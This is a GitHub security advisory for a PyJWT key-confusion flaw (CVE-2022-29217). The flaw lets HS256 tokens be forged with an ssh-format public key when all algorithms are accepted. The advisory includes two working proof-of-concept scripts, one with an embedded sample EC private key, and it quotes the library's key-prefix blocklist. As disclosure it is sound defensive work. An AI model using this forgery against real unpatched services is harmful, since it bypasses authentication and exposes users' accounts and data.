# [H] Key confusion through non-blocklisted public key formats

## Summary
Severity: High
Advisory: GHSA-ffqj-6fqr-9h24
CVE: CVE-2022-29217
CWE: CWE-327
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2022-05-24
Source: https://github.com/advisories/GHSA-ffqj-6fqr-9h24
Type: github-advisory

## Affected
- PyPI: `pyjwt` — affected >=1.5.0 <2.4.0

## Details
### Impact
_What kind of vulnerability is it? Who is impacted?_

Disclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).

> PyJWT supports multiple different JWT signing algorithms. With JWT, an 
> attacker submitting the JWT token can choose the used signing algorithm.
> 
> The PyJWT library requires that the application chooses what algorithms 
> are supported. The application can specify 
> "jwt.algorithms.get_default_algorithms()" to get support for all 
> algorithms. They can also specify a single one of them (which is the 
> usual use case if calling jwt.decode directly. However, if calling 
> jwt.decode in a helper function, all algorithms might be enabled.)
> 
> For example, if the user chooses "none" algorithm and the JWT checker 
> supports that, there will be no signature checking. This is a common 
> security issue with some JWT implementations.
> 
> PyJWT combats this by requiring that the if the "none" algorithm is 
> used, the key has to be empty. As the key is given by the application 
> running the checker, attacker cannot force "none" cipher to be used.
> 
> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is 
> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used 
> if the key begins with "ssh-rsa". If HMAC is used with a public key, the 
> attacker can just use the publicly known public key to sign the token 
> and the checker would use the same key to verify.
> 
>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. 
> With ed25519, PyJWT supports public keys that start with "ssh-", for 
> example "ssh-ed25519".

```python
import jwt
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

# Generate ed25519 private key
private_key = ed25519.Ed25519PrivateKey.generate()

# Get private key bytes as they would be stored in a file
priv_key_bytes = 
private_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, 
encryption_algorithm=serialization.NoEncryption())

# Get public key bytes as they would be stored in a file
pub_key_bytes = 
private_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)

# Making a good jwt token that should work by signing it with the 
private key
encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="EdDSA")

# Using HMAC with the public key to trick the receiver to think that the 
public key is a HMAC secret
encoded_bad = jwt.encode({"test": 1234}, pub_key_bytes, algorithm="HS256")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, pub_key_bytes, 
algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
     print("POC Successfull")

# Of course the receiver should specify ed25519 algorithm to be used if 
they specify ed25519 public key. However, if other algorithms are used, 
the POC does not work
# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py
#
#        invalid_strings = [
#            b"-----BEGIN PUBLIC KEY-----",
#            b"-----BEGIN CERTIFICATE-----",
#            b"-----BEGIN RSA PUBLIC KEY-----",
#            b"ssh-rsa",
#        ]
#
# However, OKPAlgorithm (ed25519) accepts the following in 
jwt/algorithms.py:
#
#                if "-----BEGIN PUBLIC" in str_key:
#                    return load_pem_public_key(key)
#                if "-----BEGIN PRIVATE" in str_key:
#                    return load_pem_private_key(key, password=None)
#                if str_key[0:4] == "ssh-":
#                    return load_ssh_public_key(key)
#
# These should most likely made to match each other to prevent this behavior
```


```python
import jwt

#openssl ecparam -genkey -name prime256v1 -noout -out ec256-key-priv.pem
#openssl ec -in ec256-key-priv.pem -pubout > ec256-key-pub.pem
#ssh-keygen -y -f ec256-key-priv.pem > ec256-key-ssh.pub

priv_key_bytes = b"""-----BEGIN EC PRIVATE KEY-----
MHcCAQEEIOWc7RbaNswMtNtc+n6WZDlUblMr2FBPo79fcGXsJlGQoAoGCCqGSM49
AwEHoUQDQgAElcy2RSSSgn2RA/xCGko79N+7FwoLZr3Z0ij/ENjow2XpUDwwKEKk
Ak3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END EC PRIVATE KEY-----"""

pub_key_bytes = b"""-----BEGIN PUBLIC KEY-----
MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAElcy2RSSSgn2RA/xCGko79N+7FwoL
Zr3Z0ij/ENjow2XpUDwwKEKkAk3TDXC9U8nipMlGcY7sDpXp2XyhHEM+Rw==
-----END PUBLIC KEY-----"""

ssh_key_bytes = b"""ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJXMtkUkkoJ9kQP8QhpKO/TfuxcKC2a92dIo/xDY6MNl6VA8MChCpAJN0w1wvVPJ4qTJRnGO7A6V6dl8oRxDPkc="""

# Making a good jwt token that should work by signing it with the private key
encoded_good = jwt.encode({"test": 1234}, priv_key_bytes, algorithm="ES256")

# Using HMAC with the ssh public key to trick the receiver to think that the public key is a HMAC secret
encoded_bad = jwt.encode({"test": 1234}, ssh_key_bytes, algorithm="HS256")

# Both of the jwt tokens are validated as valid
decoded_good = jwt.decode(encoded_good, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())
decoded_bad = jwt.decode(encoded_bad, ssh_key_bytes, algorithms=jwt.algorithms.get_default_algorithms())

if decoded_good == decoded_bad:
    print("POC Successfull")
else:
    print("POC Failed")
```

> The issue is not that big as 
> algorithms=jwt.algorithms.get_default_algorithms() has to be used. 
> However, with quick googling, this seems to be used in some cases at 
> least in some minor projects.

### Patches

Users should upgrade to v2.4.0.

### Workarounds

Always be explicit with the algorithms that are accepted and expected when decoding.

### References
_Are there any links users can visit to find out more?_

### For more information
If you have any questions or comments about this advisory:
* Open an issue in https://github.com/jpadilla/pyjwt
* Email José Padilla: pyjwt at jpadilla dot com

## References
- https://github.com/jpadilla/pyjwt/security/advisories/GHSA-ffqj-6fqr-9h24
- https://nvd.nist.gov/vuln/detail/CVE-2022-29217
- https://github.com/jpadilla/pyjwt/commit/9c528670c455b8d948aff95ed50e22940d1ad3fc
- https://github.com/jpadilla/pyjwt
- https://github.com/jpadilla/pyjwt/releases/tag/2.4.0
- https://github.com/pypa/advisory-database/tree/main/vulns/pyjwt/PYSEC-2022-202.yaml
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/5PK7IQCBVNLYJEFTPHBBPFP72H4WUFNX
- https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/6HIYEYZRQEP6QTHT3EHH3RGFYJIHIMAO
